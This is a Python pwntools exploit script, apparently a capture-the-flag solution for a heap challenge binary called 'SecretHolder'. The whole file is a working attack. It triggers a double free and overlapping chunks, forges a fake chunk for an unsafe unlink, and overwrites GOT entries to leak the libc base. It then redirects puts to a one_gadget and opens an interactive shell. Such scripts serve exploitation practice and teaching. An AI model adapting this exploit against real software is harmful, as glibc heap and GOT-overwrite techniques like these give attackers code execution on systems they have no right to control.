from pwn import *

io = remote('0.0.0.0', 10001)		# io = process('./SecretHolder')
elf = ELF('SecretHolder')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

small_ptr = 0x006020b0
big_ptr = 0x006020a0

def keep(idx):
	io.sendlineafter("Renew secret\n", '1')
	io.sendlineafter("Huge secret\n", str(idx))
	io.sendafter("secret: \n", 'AAAA')

def wipe(idx):
	io.sendlineafter("Renew secret\n", '2')
	io.sendlineafter("Huge secret\n", str(idx))

def renew(idx, content):
	io.sendlineafter("Renew secret\n", '3')
	io.sendlineafter("Huge secret\n", str(idx))
	io.sendafter("secret: \n", content)

def unlink():
	keep(1)
	wipe(1)
	keep(2)		# big
	wipe(1)				# double free
	keep(1)		# small	# overlapping
	keep(3)
	wipe(3)
	keep(3)		# huge

	payload  = p64(0)						# fake prev_size
	payload += p64(0x21)					# fake size
	payload += p64(small_ptr - 0x18)		# fake fd
	payload += p64(small_ptr - 0x10)		# fake bk
	payload += p64(0x20)					# fake prev_size of next
	payload += p64(0x61a90)				# fake size of next
	renew(2, payload)	# use after free

	wipe(3)				# unsafe unlink

def leak():
	global one_gadget

	payload  = "A" * 8
	payload += p64(elf.got['free'])	# *big_ptr = free@got.plt
	payload += "A" * 8
	payload += p64(big_ptr)			# *small_ptr = big_ptr
	renew(1, payload)
	renew(2, p64(elf.plt['puts']))	# *free@got.plt = puts@plt
	renew(1, p64(elf.got['puts']))	# *big_ptr = puts@got.plt

	wipe(2)				# puts(puts@got.plt)
	puts_addr = u64(io.recvline()[:6] + "\x00\x00")
	libc_base = puts_addr - libc.symbols['puts']
	one_gadget = libc_base + 0x45216

	log.info("libc base: 0x%x" % libc_base)
	log.info("one_gadget address: 0x%x" % one_gadget)

def pwn():
	payload  = "A" * 0x10
	payload += p64(elf.got['puts'])	# *small_ptr = puts@got.plt
	renew(1, payload)

	renew(1, p64(one_gadget))			# *puts@got.plt = one_gadget
	io.interactive()

unlink()
leak()
pwn()
